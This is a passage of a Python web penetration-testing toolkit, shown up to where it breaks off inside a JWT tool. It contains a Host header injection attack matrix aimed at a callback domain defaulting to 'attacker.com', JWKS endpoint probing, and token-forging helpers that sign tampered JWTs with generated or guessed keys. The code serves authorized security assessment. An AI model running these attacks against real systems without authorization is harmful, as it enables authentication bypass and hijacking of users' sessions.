#!/usr/bin/env python3
"""
Web VAPT Toolkit (consolidated, standalone)

A single-file consolidation of the original modular toolkit:
    1.  Host Header Injection Tester
    2.  JWT Inspector + Test Plan Generator
    3.  Insecure Headers Enumeration
    4.  SSL / TLS Audit
    5.  Request Smuggling Exploitation
    6.  CORS Misconfiguration Checks
    7.  Open Redirect Tester
    8.  HTTP Methods / Dangerous Verbs Check
    9.  Reflected XSS Quick Probe
    10. SSRF Candidate Detector
    11. IDOR Heuristics
    12. Cache Poisoning Signal Checks
    13. Clickjacking PoC Generator

All tools are self-contained in this file. To produce a truly portable
binary (no Python / no internet needed on the target machine), use
PyInstaller --- see the build instructions shipped alongside this file.

Usage:
    python vapt_toolkit.py            # interactive menu
    python vapt_toolkit.py <number>   # jump straight to a tool

Authorized testing only. Use against systems you own or have written
permission to assess.
"""

from __future__ import annotations

# ---------------------------------------------------------------------------
# Standard library
# ---------------------------------------------------------------------------
import base64
import hashlib
import hmac
import http.server
import importlib.util
import json
import os
import random
import re
import socket
import socketserver
import ssl
import string
import sys
import textwrap
import time
import warnings
import webbrowser
from collections import defaultdict
from dataclasses import dataclass, asdict
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import (
    parse_qsl,
    quote_plus,
    urlencode,
    urlparse,
    urlunparse,
)

# ---------------------------------------------------------------------------
# Third-party (bundled via PyInstaller for the standalone build)
# ---------------------------------------------------------------------------
import requests
import urllib3
from colorama import Fore, Style, init as _colorama_init

# httpx is only used by the host-header tool. Import lazily there so that
# users who strip httpx out of the build can still use everything else.
try:
    import httpx  # noqa: F401  (imported in tool 1 lazily)
    _HAS_HTTPX = True
except Exception:
    _HAS_HTTPX = False

# cryptography is only used by the SSL/TLS tool. Same lazy idea.
try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    _HAS_CRYPTOGRAPHY = True
except Exception:
    _HAS_CRYPTOGRAPHY = False


# ---------------------------------------------------------------------------
# Global setup
# ---------------------------------------------------------------------------
_colorama_init(autoreset=True)
warnings.simplefilter("ignore", urllib3.exceptions.InsecureRequestWarning)


# ---------------------------------------------------------------------------
# Shared helpers (used by multiple tools)
# ---------------------------------------------------------------------------
def shared_collect_urls(prompt: Optional[str] = None) -> List[str]:
    """Collect URLs pasted one-per-line; blank line ends input."""
    if prompt is None:
        prompt = "Paste URLs (one per line). Blank line to start.\n"
    print(Fore.CYAN + prompt + Style.RESET_ALL)
    out: List[str] = []
    while True:
        try:
            line = input().strip()
        except EOFError:
            break
        if not line:
            break
        out.append(line)
    return out


def shared_rebuild_url(u: str, params: List[Tuple[str, str]]) -> str:
    """Rebuild a URL after mutating its query parameters."""
    p = urlparse(u)
    return urlunparse(
        (p.scheme, p.netloc, p.path, p.params, urlencode(params, doseq=True), p.fragment)
    )


def shared_rand(n: int = 8) -> str:
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


def shared_default_ua() -> Dict[str, str]:
    return {"User-Agent": "web-vapt-toolkit/1.0"}


# ===========================================================================
# TOOL 1: Host Header Injection Tester
# ===========================================================================
def host_color(text: str, c: str) -> str:
    return c + text + Style.RESET_ALL


def host_target_components(url: str) -> Tuple[str, str, int, str]:
    u = urlparse(url)
    scheme = u.scheme or "https"
    host = u.hostname or ""
    port = u.port or (443 if scheme == "https" else 80)
    path = (u.path or "/") + (("?" + u.query) if u.query else "")
    return scheme, host, port, path


def host_extract_hostname_from_location(location: Optional[str]) -> Optional[str]:
    if not location:
        return None
    try:
        return urlparse(location).hostname
    except Exception:
        return None


def host_classify_result(
    status: Optional[int],
    location: Optional[str],
    body_snippet: str,
    injected_host: str,
    subdomain_keyword: str,
) -> Tuple[str, str]:
    host_in_location = host_extract_hostname_from_location(location)

    if location and injected_host and injected_host in location:
        return "success", "Redirect reflects injected host"
    if status == 200 and injected_host and injected_host in body_snippet:
        return "success", "Body reflects injected host"

    if subdomain_keyword:
        if host_in_location and subdomain_keyword.lower() in host_in_location.lower():
            return "success", "Redirect host contains subdomain keyword"
        if status == 200 and subdomain_keyword.lower() in body_snippet.lower():
            return "success", "Body contains subdomain keyword"

    if status in (301, 302, 303, 307, 308) and location:
        return "interesting", "Redirect observed (host not reflected)"
    if status and status >= 500:
        return "interesting", "Server error (possible differential behavior)"

    if status == 400 and "invalid host" in body_snippet.lower():
        return "fail", "Explicit invalid host"
    return "fail", "No reflection or routing change detected"


def host_summarize(resp, injected_host: str, subdomain_keyword: str) -> Dict[str, Any]:
    status = resp.status_code if resp is not None else None
    location = resp.headers.get("Location") if resp is not None else None
    try:
        body_snippet = resp.text[:1200] if resp is not None else ""
    except Exception:
        body_snippet = ""
    verdict, reason = host_classify_result(status, location, body_snippet, injected_host, subdomain_keyword)
    return {"status": status, "location": location, "verdict": verdict, "reason": reason}


def host_build_base_headers(auth_choice: str) -> Dict[str, str]:
    headers = {"User-Agent": "HostHeaderInject/Interactive", "Accept": "*/*"}
    if auth_choice == "bearer":
        token = input("Enter Bearer token: ").strip()
        headers["Authorization"] = "Bearer " + token
    elif auth_choice == "cookie":
        cookie = input("Enter Cookie string: ").strip()
        headers["Cookie"] = cookie
    extra = input("Any extra headers? (key:value, comma separated, or leave blank): ").strip()
    if extra:
        for kv in extra.split(","):
            if ":" in kv:
                k, v = kv.split(":", 1)
                headers[k.strip()] = v.strip()
    return headers


def host_attack_matrix(target_host: str, injected_host: str, subdomain_keyword: str) -> List[Dict[str, Any]]:
    return [
        {"name": "Host with non-numeric port", "headers": {"Host": f"{target_host}:bad-stuff-here"}},
        {"name": "Host arbitrary subdomain", "headers": {"Host": f"not{target_host}"}},
        {"name": "Host compromised subdomain", "headers": {"Host": f"{subdomain_keyword}.{target_host}"}},

        {"name": "Duplicate Host (front-end first)", "headers": [("Host", target_host), ("Host", injected_host)]},
        {"name": "Duplicate Host (back-end first)", "headers": [("Host", injected_host), ("Host", target_host)]},

        {"name": "Absolute URL HTTPS", "headers": {"Host": injected_host}, "request_line_override": f"https://{target_host}/"},
        {"name": "Absolute URL HTTP", "headers": {"Host": injected_host}, "request_line_override": f"http://{target_host}/"},

        {"name": "Indented Host then normal", "headers": [(" Host", injected_host), ("Host", target_host)]},
        {"name": "Normal Host then indented", "headers": [("Host", target_host), (" Host", injected_host)]},

        {"name": "X-Forwarded-Host override", "headers": {"Host": target_host, "X-Forwarded-Host": injected_host}},
        {"name": "X-Host override", "headers": {"Host": target_host, "X-Host": injected_host}},
        {"name": "X-Forwarded-Server override", "headers": {"Host": target_host, "X-Forwarded-Server": injected_host}},
        {"name": "X-HTTP-Host-Override", "headers": {"Host": target_host, "X-HTTP-Host-Override": injected_host}},
        {"name": "Forwarded header host=", "headers": {"Host": target_host, "Forwarded": f"host={injected_host}"}},
    ]


def host_run_attacks(client, scheme, host, port, path, attacks, injected_host, subdomain_keyword, mode_label):
    print(host_color(f"\n[+] Running attacks under mode: {mode_label}", Fore.YELLOW))
    results = []
    for attack in attacks:
        name = attack["name"]
        try:
            req_url = f"{scheme}://{host}:{port}{path}"
            absolute = attack.get("request_line_override")
            url_for_request_line = absolute if absolute else req_url
            resp = client.get(url_for_request_line, headers=attack["headers"])
            res = host_summarize(resp, injected_host, subdomain_keyword)
        except Exception as e:
            res = {"status": None, "location": None, "verdict": "fail", "reason": f"error: {str(e)}"}
        results.append({
            "attack": name,
            "status": res["status"],
            "location": res["location"],
            "verdict": res["verdict"],
            "reason": res["reason"],
            "mode": mode_label,
        })
    return results


def host_group_and_print_results(results: List[Dict[str, Any]]) -> None:
    success = [r for r in results if r["verdict"] == "success"]
    interest = [r for r in results if r["verdict"] == "interesting"]
    fail = [r for r in results if r["verdict"] == "fail"]

    print(host_color("\n=== Successful attacks ===", Fore.GREEN))
    for r in success:
        print(host_color(f"[SUCCESS] {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.GREEN))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(host_color("\n=== Possible attacks (Interest) ===", Fore.YELLOW))
    for r in interest:
        print(host_color(f"[INTEREST] {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.YELLOW))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(host_color("\n=== Failed attacks ===", Fore.RED))
    for r in fail:
        print(host_color(f"[FAIL]    {r['attack']:30s} | {r['status']} | {r['reason']} | Mode: {r['mode']}", Fore.RED))
        if r.get("location"):
            print(f"          Location: {r['location']}")

    print(f"\n[+] Summary: Success={len(success)} | Interest={len(interest)} | Fail={len(fail)} | Total={len(results)}")


def run_host_attacker() -> None:
    if not _HAS_HTTPX:
        print(Fore.RED + "[!] This tool requires httpx. Install httpx and rebuild." + Style.RESET_ALL)
        return
    import httpx as _httpx  # local

    print("=== Host Header Injection Tester ===")

    url = input("Target URL: ").strip()
    if not url:
        print("Target URL is required.")
        return

    injected_host = input("Malicious callback domain (e.g. attacker.com): ").strip() or "attacker.com"
    subdomain_keyword = input("Keyword to detect subdomain manipulation (press Enter to skip): ").strip() or "attacker"

    auth_choice = input("Do you need authentication? (none/bearer/cookie): ").strip().lower() or "none"
    headers = host_build_base_headers(auth_choice)

    do_downgrade_http = (input("If target is HTTPS, also try HTTP downgrade? (y/n): ").strip().lower() or "y") == "y"
    force_http11 = (input("Also force HTTP/1.1 (instead of HTTP/2)? (y/n): ").strip().lower() or "y") == "y"

    scheme, host, port, path = host_target_components(url)
    attacks = host_attack_matrix(host, injected_host, subdomain_keyword)

    all_results: List[Dict[str, Any]] = []

    client_normal = _httpx.Client(headers=headers, timeout=10, follow_redirects=False)
    all_results += host_run_attacks(client_normal, scheme, host, port, path, attacks,
                                    injected_host, subdomain_keyword, "Normal")

    if do_downgrade_http and scheme == "https":
        client_http = _httpx.Client(headers=headers, timeout=10, follow_redirects=False)
        all_results += host_run_attacks(client_http, "http", host, 80, path, attacks,
                                        injected_host, subdomain_keyword, "Downgraded to HTTP")

    if force_http11:
        client_h1 = _httpx.Client(headers=headers, timeout=10, follow_redirects=False, http2=False)
        all_results += host_run_attacks(client_h1, scheme, host, port, path, attacks,
                                        injected_host, subdomain_keyword, "Forced HTTP/1.1")

    host_group_and_print_results(all_results)

    report = {
        "target": url,
        "injected_host": injected_host,
        "subdomain_keyword": subdomain_keyword,
        "timestamp": int(time.time()),
        "results": all_results,
    }
    out_path = "host_inject_report.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print(f"\n[+] Report saved to {out_path}")




# ===========================================================================
# TOOL 2: JWT Workflow (REPL with persistent token + session state)
# ---------------------------------------------------------------------------
# A unified JWT toolkit that combines the audit-style inspector (decode,
# risk flags, JWKS probe, test plan, exportable report) with the active
# forge / exploit operations (alg=none, KID injection, JKU swap, JWK
# embedding in two forms, claim tampering, HMAC brute-force, modulus
# recovery, PEM<->JWK conversions).
#
# Design:
#   - One menu loop holds an active token + decoded form + session ctx.
#   - Decode is always one keypress -- never re-prompt to re-paste.
#   - Forge ops show the result, then offer to make it the new active
#     token so you can chain transformations.
#   - History lets you reload any previously generated token.
#   - All RSA crypto goes through the `cryptography` library (already
#     bundled for the SSL/TLS tool), so no pycryptodome dependency.
# ===========================================================================

# Color helpers (prefixed to avoid collisions with other tools)
def jwt_c_title(s: str) -> str: return f"{Fore.CYAN}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def jwt_c_good(s: str)  -> str: return f"{Fore.GREEN}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def jwt_c_warn(s: str)  -> str: return f"{Fore.YELLOW}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def jwt_c_bad(s: str)   -> str: return f"{Fore.RED}{Style.BRIGHT}{s}{Style.RESET_ALL}"
def jwt_c_muted(s: str) -> str: return f"{Fore.WHITE}{Style.DIM}{s}{Style.RESET_ALL}"
def jwt_hr(ch: str = "-", w: int = 72) -> str: return ch * w


JWT_BANNER = f"""{Fore.MAGENTA}{Style.BRIGHT}
     _ _      _        _           _ _
    | (_)    | |      | |         | (_)
    | |_  ___| |_ __ _| |__  _   _| |_ _ __ ___
    | | |/ __| __/ _` | '_ \\| | | | | | '__/ _ \\
    | | | (__| || (_| | |_) | |_| | | | | |  __/
    |_|_|\\___|\\__\\__,_|_.__/ \\__,_|_|_|_|  \\___|
{Style.RESET_ALL}
{jwt_c_title("JWT Workflow -- Audit + Forge (unified REPL)")}
{jwt_c_muted("Decode | Flag | Probe | Forge | Brute | Recover | Convert | Export")}
"""


# -----------------------------------------------------------------------------
# Data models
# -----------------------------------------------------------------------------
@dataclass
class JwtSessionContext:
    """HTTP session context (used for JWKS / OIDC discovery and report export)."""
    base_url: str = ""
    authorization: str = ""
    cookie: str = ""
    extra_headers_json: str = ""

    def headers(self) -> Dict[str, str]:
        h = {"User-Agent": "jwt-audit/1.0"}
        if self.authorization.strip():
            h["Authorization"] = self.authorization.strip()
        if self.cookie.strip():
            h["Cookie"] = self.cookie.strip()
        if self.extra_headers_json.strip():
            try:
                extra = json.loads(self.extra_headers_json)
                if isinstance(extra, dict):
                    for k, v in extra.items():
                        if isinstance(k, str) and isinstance(v, (str, int, float, bool)):
                            h[k] = str(v)
            except Exception:
                pass
        return h


@dataclass
class JwtInfo:
    raw: str
    header_b64: str = ""
    payload_b64: str = ""
    signature_b64: str = ""
    header: Dict[str, Any] = None  # type: ignore
    payload: Dict[str, Any] = None  # type: ignore
    parse_error: str = ""
    alg: str = ""
    kid: str = ""
    jku: str = ""
    has_jwk: bool = False
    is_jws: bool = True
    is_jwe: bool = False
    risk_flags: List[str] = None  # type: ignore


@dataclass
class JwtDiscoveryResult:
    url: str
    status: int
    content_type: str
    note: str = ""
    body_snippet: str = ""


@dataclass
class JwtSession:
    """Persistent state for the JWT REPL. Lives across all sub-operations."""
    active_token: str = ""
    active_info: Optional[JwtInfo] = None
    ctx: JwtSessionContext = None  # type: ignore
    history: List[Tuple[str, str]] = None  # type: ignore  # list of (label, token)

    def __post_init__(self):
        if self.ctx is None:
            self.ctx = JwtSessionContext()
        if self.history is None:
            self.history = []

    def set_active(self, token: str, label: str = "loaded") -> None:
        token = token.strip()
        if not token:
            return
        self.active_token = token
        self.active_info = jwt_parse(token)
        self.history.append((label, token))


# -----------------------------------------------------------------------------
# Base64url + JSON helpers
# -----------------------------------------------------------------------------
def jwt_b64url_decode_to_bytes(s: str) -> bytes:
    s = s.strip()
    padding = "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s + padding)


def jwt_b64url_encode_bytes(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def jwt_b64url_encode_json(obj: Dict[str, Any]) -> str:
    """Compact JSON, then base64url encode (JWT canonical form)."""
    s = json.dumps(obj, separators=(",", ":"), ensure_ascii=False)
    return jwt_b64url_encode_bytes(s.encode("utf-8"))


def jwt_safe_json_load(b: bytes) -> Dict[str, Any]:
    return json.loads(b.decode("utf-8", errors="replace"))


def jwt_pretty_json(obj: Any) -> str:
    return json.dumps(obj, indent=2, ensure_ascii=False)


def jwt_is_probably_jwe(token: str) -> bool:
    return len(token.split(".")) == 5


# -----------------------------------------------------------------------------
# Parsing + risk analysis (from the new audit-style inspector)
# -----------------------------------------------------------------------------
def jwt_parse(token: str) -> JwtInfo:
    info = JwtInfo(raw=token.strip(), header={}, payload={}, risk_flags=[])
    t = info.raw
    if not t:
        info.parse_error = "Empty token"
        return info
    if jwt_is_probably_jwe(t):
        info.is_jwe = True
        info.is_jws = False
        info.parse_error = "Looks like a JWE (5 parts). This tool focuses on JWS. Decode JWE separately."
        return info

    parts = t.split(".")
    if len(parts) != 3:
        info.parse_error = f"Token must have 3 parts (JWS). Found {len(parts)} parts."
        return info
    info.header_b64, info.payload_b64, info.signature_b64 = parts

    try:
        info.header = jwt_safe_json_load(jwt_b64url_decode_to_bytes(info.header_b64))
    except Exception as e:
        info.parse_error = f"Failed to decode header JSON: {e}"
        return info
    try:
        info.payload = jwt_safe_json_load(jwt_b64url_decode_to_bytes(info.payload_b64))
    except Exception as e:
        info.parse_error = f"Failed to decode payload JSON: {e}"
        return info

    info.alg = str(info.header.get("alg", "") or "")
    info.kid = str(info.header.get("kid", "") or "")
    info.jku = str(info.header.get("jku", "") or "")
    info.has_jwk = "jwk" in info.header
    info.risk_flags.extend(jwt_analyze_risks(info.header, info.payload))
    return info


def jwt_analyze_risks(header: Dict[str, Any], payload: Dict[str, Any]) -> List[str]:
    flags: List[str] = []
    alg = str(header.get("alg", "") or "").upper()

    if alg in ("NONE", ""):
        flags.append("Header.alg is 'none' or empty (must be rejected)")
    if "jku" in header:
        flags.append("Header contains 'jku' (must enforce allowlist + HTTPS + no redirects)")
    if "jwk" in header:
        flags.append("Header contains embedded 'jwk' (must not trust attacker-controlled keys)")
    if "kid" in header:
        kid = str(header.get("kid") or "")
        if "../" in kid or "..\\" in kid:
            flags.append("Header.kid contains path traversal patterns (must be sanitized)")
        if kid.startswith(("http://", "https://")):
            flags.append("Header.kid looks like URL (must not fetch keys from untrusted locations)")
        if len(kid) > 200:
            flags.append("Header.kid unusually long (possible injection/path tricks)")

    if alg.startswith("HS") and "kid" in header:
        flags.append("HMAC token with kid: verify key-selection logic is not file-based or attacker-controlled")
    if alg.startswith("RS") or alg.startswith("ES"):
        flags.append("Asymmetric token: validate server rejects alg confusion and enforces expected alg")

    now = int(datetime.now(timezone.utc).timestamp())

    def _get_int(k: str) -> Optional[int]:
        v = payload.get(k)
        if isinstance(v, bool):
            return None
        try:
            if isinstance(v, (int, float, str)) and str(v).strip():
                return int(float(v))
        except Exception:
            return None
        return None

    exp = _get_int("exp")
    nbf = _get_int("nbf")

    if exp is None:
        flags.append("Payload missing exp (or not numeric) -- session lifetime may be uncontrolled")
    else:
        if exp < now:
            flags.append("Token exp is in the past (may indicate replay / clock issues)")
        if exp - now > 60 * 60 * 24 * 30:
            flags.append("Token exp is far in the future (>30 days) -- check session lifetime policy")
    if nbf is not None and nbf > now + 300:
        flags.append("nbf is significantly in the future -- check clock skew handling")

    if "aud" not in payload:
        flags.append("Payload missing aud -- audience scoping might be weak")
    if "iss" not in payload:
        flags.append("Payload missing iss -- issuer scoping might be weak")

    for k in ("role", "roles", "admin", "is_admin", "scope", "scopes", "permissions"):
        if k in payload:
            flags.append(f"Payload contains '{k}' -- ensure server does not trust client-controlled authorization claims blindly")
    return flags


# -----------------------------------------------------------------------------
# JWKS / OIDC discovery
# -----------------------------------------------------------------------------
JWT_JWKS_PATHS = [
    "/.well-known/openid-configuration",
    "/.well-known/jwks.json",
    "/jwks.json",
    "/oauth/jwks",
    "/api/jwks",
    "/api/keys",
    "/api/v1/jwks",
    "/api/v1/keys",
    "/keys",
    "/public/keys",
    "/public/jwks.json",
]


def jwt_join_url(base: str, path: str) -> str:
    base = (base or "").strip().rstrip("/")
    if not base:
        return ""
    if not path.startswith("/"):
        path = "/" + path
    return base + path


def jwt_sniff_jwks(body: str) -> Tuple[bool, str]:
    b = body.strip()
    if not b:
        return False, "Empty body"
    if '"keys"' in b and ('"kty"' in b or '"kid"' in b or '"x5c"' in b):
        return True, "Looks like JWKS"
    if '"jwks_uri"' in b:
        return True, "Looks like OIDC config (jwks_uri present)"
    return False, "No obvious JWKS/OIDC markers"


def jwt_probe_endpoints(ctx: JwtSessionContext, timeout: int = 6) -> List[JwtDiscoveryResult]:
    results: List[JwtDiscoveryResult] = []
    if not ctx.base_url.strip():
        return results
    sess = requests.Session()
    headers = ctx.headers()
    for path in JWT_JWKS_PATHS:
        url = jwt_join_url(ctx.base_url, path)
        try:
            r = sess.get(url, headers=headers, timeout=timeout, verify=False, allow_redirects=True)
            ct = (r.headers.get("Content-Type") or "").split(";")[0].strip().lower()
            body = r.text or ""
            looks, _note = jwt_sniff_jwks(body)
            snippet = body[:400].replace("\r", "").replace("\n", "\\n")
            results.append(JwtDiscoveryResult(
                url=url, status=r.status_code, content_type=ct,
                note=(jwt_c_good("Possible key material / config") if looks else ""),
                body_snippet=snippet,
            ))
        except Exception as e:
            results.append(JwtDiscoveryResult(
                url=url, status=0, content_type="", note=f"Request failed: {e}", body_snippet="",
            ))
    return results


# -----------------------------------------------------------------------------
# Test plan generator + report export
# -----------------------------------------------------------------------------
def jwt_generate_test_plan(jwt_infos: List[JwtInfo], ctx: JwtSessionContext) -> str:
    lines: List[str] = []
    lines.append("# JWT Test Plan (Burp Repeater)\n")
    lines.append("This plan is generated from observed JWT header/payload fields. Validate behavior in **Burp Repeater**.\n")
    if ctx.base_url:
        lines.append(f"- Base URL (from session): `{ctx.base_url}`\n")

    lines.append("## 1) Baseline capture\n")
    lines.append("- In Burp, capture a normal authenticated request that uses the JWT.")
    lines.append("- Send to **Repeater** and label it `JWT - Baseline`.")
    lines.append("- Record response: status, body markers, and any account/role indicators.\n")

    lines.append("## 2) Claim validation tests (safe)\n")
    lines.append("For each, edit the JWT payload and observe whether the server rejects (401/403) or incorrectly accepts.\n")
    lines.append("- `exp`: set to past time; set to far-future time; remove it")
    lines.append("- `nbf`: set far in future")
    lines.append("- `aud`: change to random value; remove it")
    lines.append("- `iss`: change to random value; remove it")
    lines.append("- AuthZ-looking claims (role/scope/admin): change values and verify server-side authz remains correct\n")
    lines.append("> Expected secure behavior: token rejected if signature invalid OR critical claims are incorrect/missing.\n")

    lines.append("## 3) Header validation tests (safe)\n")
    lines.append("- `alg`: verify server rejects unexpected/insecure algorithms (e.g., `none`).")
    lines.append("- `kid`: verify it is treated as identifier only, not a file path or URL.")
    lines.append("- `jku`: verify allowlist enforced and no attacker-controlled redirects.")
    lines.append("- `jwk`: verify server does NOT trust embedded keys directly.\n")

    lines.append("## 4) Key management / discovery\n")
    lines.append("- JWKS endpoints reachable as expected (often public for OIDC).")
    lines.append("- `kid` selection logic safe; keys rotate safely.")
    lines.append("- JWKS endpoints do not expose private key material.\n")

    lines.append("## 5) Notes based on observed tokens\n")
    for i, j in enumerate(jwt_infos, start=1):
        lines.append(f"### Token #{i}\n")
        if j.parse_error:
            lines.append(f"- Parse error: **{j.parse_error}**\n")
            continue
        lines.append(f"- Header.alg: `{j.alg}`")
        if j.kid: lines.append(f"- Header.kid: `{j.kid}`")
        if j.jku: lines.append(f"- Header.jku: `{j.jku}`")
        if j.has_jwk: lines.append("- Header.jwk: present")
        lines.append("")
        if j.risk_flags:
            lines.append("**Risk indicators to validate:**")
            for f in j.risk_flags:
                lines.append(f"- {f}")
            lines.append("")
        else:
            lines.append("- No obvious heuristic flags; still perform baseline claim/header validation.\n")

    lines.append("## 6) Reporting guidance\n")
    lines.append("- Only report a finding with demonstrated **impact** and **server behavior** (accepts invalid/forged tokens or fails claim validation).")
    lines.append("- Include evidence: request/response pairs, timestamps, expected vs observed.\n")
    return "\n".join(lines)


def jwt_make_output_dir(prefix: str = "jwt-audit") -> str:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    outdir = os.path.join(os.getcwd(), f"{prefix}_{ts}")
    os.makedirs(outdir, exist_ok=True)
    return outdir


def jwt_export_report(outdir: str, ctx: JwtSessionContext, jwts: List[JwtInfo],
                      discoveries: List[JwtDiscoveryResult], plan_md: str,
                      forge_history: List[Tuple[str, str]]) -> Tuple[str, str]:
    bundle = {
        "created_at": datetime.now(timezone.utc).isoformat(),
        "session": asdict(ctx),
        "jwts": [asdict(j) for j in jwts],
        "discoveries": [asdict(d) for d in discoveries],
        "forge_history": [{"label": lbl, "token": tok} for lbl, tok in forge_history],
        "test_plan_markdown": plan_md,
    }
    json_path = os.path.join(outdir, "report.json")
    md_path = os.path.join(outdir, "report.md")

    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(bundle, f, indent=2, default=str)

    md_lines: List[str] = []
    md_lines.append("# JWT Assessment Report\n")
    md_lines.append(f"- Created (UTC): `{bundle['created_at']}`\n")
    md_lines.append("## Session context\n")
    md_lines.append(f"- Base URL: `{ctx.base_url}`")
    md_lines.append(f"- Authorization provided: `{'yes' if bool(ctx.authorization.strip()) else 'no'}`")
    md_lines.append(f"- Cookie provided: `{'yes' if bool(ctx.cookie.strip()) else 'no'}`\n")

    md_lines.append("## Tokens analyzed\n")
    for i, j in enumerate(jwts, start=1):
        md_lines.append(f"### Token #{i}\n")
        if j.parse_error:
            md_lines.append(f"- Parse error: **{j.parse_error}**\n"); continue
        md_lines.append(f"- alg: `{j.alg}`")
        if j.kid: md_lines.append(f"- kid: `{j.kid}`")
        if j.jku: md_lines.append(f"- jku: `{j.jku}`")
        md_lines.append(f"- jwk present: `{'yes' if j.has_jwk else 'no'}`\n")
        md_lines.append("**Header**")
        md_lines.append("```json"); md_lines.append(jwt_pretty_json(j.header)); md_lines.append("```")
        md_lines.append("**Payload**")
        md_lines.append("```json"); md_lines.append(jwt_pretty_json(j.payload)); md_lines.append("```")
        if j.risk_flags:
            md_lines.append("**Heuristic risk flags:**")
            for f in j.risk_flags:
                md_lines.append(f"- {f}")
            md_lines.append("")
        else:
            md_lines.append("_No heuristic flags triggered._\n")

    md_lines.append("## JWKS / OIDC discovery\n")
    if not discoveries:
        md_lines.append("_No discovery performed (base URL not set)._")
    else:
        for d in discoveries:
            md_lines.append(f"- `{d.url}` -> `{d.status}` `{d.content_type}` {d.note}")
    md_lines.append("")

    if forge_history:
        md_lines.append("## Forge history\n")
        for lbl, tok in forge_history:
            md_lines.append(f"- **{lbl}**: `{tok}`")
        md_lines.append("")

    md_lines.append(plan_md)
    with open(md_path, "w", encoding="utf-8") as f:
        f.write("\n".join(md_lines))
    return json_path, md_path


# -----------------------------------------------------------------------------
# Crypto helpers (uses `cryptography` library, already bundled for SSL tool)
# -----------------------------------------------------------------------------
def _jwt_require_crypto() -> bool:
    if not _HAS_CRYPTOGRAPHY:
        print(jwt_c_bad("[!] This forge requires the `cryptography` package, which is not installed."))
        return False
    return True


def jwt_rsa_generate_keypair(bits: int = 2048):
    """Returns (private_key, public_key) cryptography objects."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    priv = rsa.generate_private_key(public_exponent=65537, key_size=bits)
    return priv, priv.public_key()


def jwt_rsa_pubkey_to_jwk(pubkey, kid: Optional[str] = None) -> Dict[str, Any]:
    """Convert a cryptography RSA public key into a JWK dict."""
    pn = pubkey.public_numbers()
    n_bytes = pn.n.to_bytes((pn.n.bit_length() + 7) // 8, "big")
    e_bytes = pn.e.to_bytes((pn.e.bit_length() + 7) // 8, "big")
    jwk = {
        "kty": "RSA",
        "n": jwt_b64url_encode_bytes(n_bytes),
        "e": jwt_b64url_encode_bytes(e_bytes),
    }
    if kid:
        jwk["kid"] = kid
    return jwk


def jwt_rsa_pubkey_to_pem(pubkey) -> bytes:
    from cryptography.hazmat.primitives import serialization
    return pubkey.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def jwt_rsa_privkey_to_pem(privkey) -> bytes:
    from cryptography.hazmat.primitives import serialization
    return privkey.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.PKCS8,
        encryption_algorithm=serialization.NoEncryption(),
    )


def jwt_jwk_to_rsa_pubkey(jwk_obj: Dict[str, Any]):
    """Convert a JWK dict into a cryptography RSA public key."""
    from cryptography.hazmat.primitives.asymmetric import rsa
    if jwk_obj.get("kty") != "RSA":
        raise ValueError("Only RSA JWKs are supported.")
    n = int.from_bytes(jwt_b64url_decode_to_bytes(jwk_obj["n"]), "big")
    e = int.from_bytes(jwt_b64url_decode_to_bytes(jwk_obj["e"]), "big")
    return rsa.RSAPublicNumbers(e, n).public_key()


def jwt_sign_rs256(privkey, signing_input: str) -> str:
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.asymmetric import padding
    sig = privkey.sign(signing_input.encode("utf-8"), padding.PKCS1v15(), hashes.SHA256())
    return jwt_b64url_encode_bytes(sig)


def jwt_sign_hs(secret_bytes: bytes, signing_input: str, algo: str = "HS256") -> str:
    algo = algo.upper()
    h = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(algo, hashlib.sha256)
    sig = hmac.new(secret_bytes, signing_input.encode("utf-8"), h).digest()
    return jwt_b64url_encode_bytes(sig)


# -----------------------------------------------------------------------------
# Generic helpers used by forge ops
# -----------------------------------------------------------------------------
def _jwt_require_active(sess: JwtSession) -> bool:
    if not sess.active_token or not sess.active_info:
        print(jwt_c_warn("[!] No active token loaded. Use [t] to load one."))
        return False
    if sess.active_info.parse_error:
        print(jwt_c_bad(f"[!] Active token has parse error: {sess.active_info.parse_error}"))
        return False
    return True


def _jwt_offer_set_active(sess: JwtSession, new_token: str, label: str) -> None:
    print(jwt_c_good(f"\n[+] Forged token ({label}):"))
    print(new_token)
    sess.history.append((label, new_token))
    ans = input("\nSet this as the new active token? (y/n) [n]: ").strip().lower()
    if ans == "y":
        sess.set_active(new_token, label=f"active:{label}")
        print(jwt_c_good(f"[+] Active token replaced with '{label}'."))


def _jwt_edit_claims_interactive(payload: Dict[str, Any]) -> Dict[str, Any]:
    """Interactively edit a payload dict. Returns the modified copy."""
    p = dict(payload)
    print(jwt_c_muted("\nCurrent claims (key: value):"))
    for k, v in p.items():
        print(f"  - {k}: {v}")
    print(jwt_c_muted("Enter blank claim name to finish. Prefix with '!' to delete (e.g. !aud)."))
    while True:
        field = input("Claim key (or blank to stop): ").strip()
        if not field:
            break
        if field.startswith("!"):
            key = field[1:].strip()
            if key in p:
                del p[key]
                print(jwt_c_warn(f"  - removed '{key}'"))
            else:
                print(jwt_c_warn(f"  - claim '{key}' not present"))
            continue
        value = input(f"New value for '{field}' (numbers/booleans entered as text): ").strip()
        # Try to coerce common types
        coerced: Any = value
        if value.lower() in ("true", "false"):
            coerced = (value.lower() == "true")
        else:
            try:
